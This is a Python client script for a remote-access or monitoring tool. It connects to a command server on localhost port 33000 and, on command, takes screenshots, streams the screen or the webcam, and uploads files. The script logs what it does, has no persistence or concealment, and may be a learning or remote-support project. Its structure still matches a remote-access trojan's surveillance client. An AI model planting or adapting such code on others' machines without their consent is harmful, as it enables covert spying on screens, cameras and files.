from socket import AF_INET, socket, SOCK_STREAM
from threading import Thread
from time import sleep
from sys import exit
from os.path import getsize, basename
import pyautogui
import cv2
import numpy as np
from vidgear.gears import ScreenGear
from vidgear.gears import NetGear
from vidgear.gears import CamGear

HOST = '127.0.0.1'
PORT = 33000
BUFSIZ = 1024
ADDR = (HOST, PORT)
CLIENT = socket(AF_INET, SOCK_STREAM)
CLIENT.connect(ADDR)
SEP = "<SEP>"

def log(mes):
    print(mes)

def send(mes):
    CLIENT.send(bytes(mes, "utf8"))

def send_file(path):
    try:
        file_name = basename(path)
        file_size = getsize(path)
        log("[*] Sending file %s..." % file_name)
        CLIENT.send(bytes(f"file{SEP}{file_name}{SEP}{file_size}", "utf8"))
        with open(path, "rb") as f:
            while True:
                bytes_read = f.read(BUFSIZ)
                if not bytes_read:
                    break
                CLIENT.sendall(bytes_read)
    except:
        log("[!] Couldn't send file to server")
        raise
    else:
        log("[*] File sent (success)")

def start_stream(typ, port):
    if typ == 'screen':
        stream = ScreenGear().start()
    elif typ == 'camera':
        stream = CamGear().start()
    server = NetGear(port=port)
    while True:

        try:

            frame = stream.read()

            if frame is None:
                break

            server.send(frame)
        
        except KeyboardInterrupt:
            break
    stream.stop()
    server.close()

def recv():
    while True:
        try:
            mes = CLIENT.recv(BUFSIZ).decode("utf8").split(SEP)
            cmd = mes[0]
            if cmd == "alive":
                log("[*] Server: stay alive")
            elif cmd == "screenshot":
                try:
                    log("[*] Command from server: " + cmd)
                    img = pyautogui.screenshot()
                    frame = np.array(img)
                    frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                    log("[*] Sending screenshot...")
                    CLIENT.send(bytes(f"{frame.nbytes}", "utf8"))
                    CLIENT.send(bytes(f"{frame.shape[0]}{SEP}{frame.shape[1]}{SEP}{frame.shape[2]}", "utf8"))
                    #while True:
                    #    bytes_read = f.read(BUFSIZ)
                    #    if not bytes_read:
                    #        break
                    CLIENT.sendall(frame.tobytes())
                except Exception as e:
                    log("[!] Couldn't take and send a screenshot")
                    log(e)
                else:
                    log("[*] Screenshot has been sent (success)")
            elif cmd in ("screen", "camera"):
                try:
                    log("[*] Command from server: " + cmd)
                    log("[*] Starting a stream...")
                    Thread(target=start_stream, args=(cmd, mes[1]), daemon=True).start()
                except Exception as e:
                    log("[!] Couldn't start a stream")
                    log(e)
                else:
                    log("[*] Stream started (success)")
            elif cmd:
                log("[!] Wrong command from server: " + SEP.join(mes))
            else:
                log("[-] Disconnected by server")
                break
        except:
            log("[-] Disconnected by server (with exception)")
            break

if __name__ == '__main__':
    Thread(target=recv, daemon=True).start()
    while True:
        inp = input()
        if inp == "q" or inp == "quit":
            log("[#] Terminating...")
            exit(0)
        else:
            log("[!] Unknown command: " + inp)
    CLIENT.close()